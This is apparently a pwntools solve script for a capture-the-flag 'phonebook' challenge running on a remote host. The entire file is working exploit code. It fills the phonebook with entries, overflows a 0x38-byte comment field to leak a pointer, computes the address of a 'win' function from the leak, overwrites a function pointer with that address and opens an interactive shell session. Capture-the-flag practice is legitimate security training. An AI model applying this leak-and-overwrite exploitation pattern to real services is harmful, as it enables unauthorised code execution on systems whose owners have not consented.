from pwn import *

# p = process("./phonebook")
# gdb.attach(p)

p = remote("10.212.138.23", 26307)

p.recvline(b"> ")
p.sendline(b"1")
p.recvuntil(b"name: ")
p.sendline(b"AAAA")
p.recvuntil(b"number: ")
p.sendline(b"BBBB")

p.recvline(b"> ")
p.sendline(b"1")
p.recvuntil(b"name: ")
p.sendline(b"CCCC")
p.recvuntil(b"number: ")
p.sendline(b"DDDD")

p.recvline(b"> ")
p.sendline(b"1")
p.recvuntil(b"name: ")
p.sendline(b"EEEE")
p.recvuntil(b"number: ")
p.sendline(b"FFFF")

p.recvline(b"> ")
p.sendline(b"1")
p.recvuntil(b"name: ")
p.sendline(b"GGGG")
p.recvuntil(b"number: ")
p.sendline(b"HHHH")

p.recvline(b"> ")
p.sendline(b"1")
p.recvuntil(b"name: ")
p.sendline(b"IIII")
p.recvuntil(b"number: ")
p.sendline(b"JJJJ")

p.recvline(b"> ")
p.sendline(b"3")
p.recvuntil(b"index: ")
p.sendline(b"1")

p.recvline(b"> ")
p.sendline(b"4")
p.recvuntil(b"index: ")
p.sendline(b"0")
p.recvuntil(b"comment: ")
p.sendline(b"A"*0x38)

p.recvline(b"> ")
p.sendline(b"2")

p.recvuntil(b"A"*0x38)

leak = u64(p.recvuntil(b">")[:6].ljust(8, b"\x00"))
win = leak-0xa+0x69

log.info(f"{hex(win)=}")

p.sendline(b"3")
p.recvuntil(b"index: ")
p.sendline(b"2")

p.recvline(b"> ")
p.sendline(b"4")
p.recvuntil(b"index: ")
p.sendline(b"0")
p.recvuntil(b"comment: ")
p.sendline(b"B"*0x38 + p64(win))

p.recvline(b"> ")
p.sendline(b"2")

p.interactive()

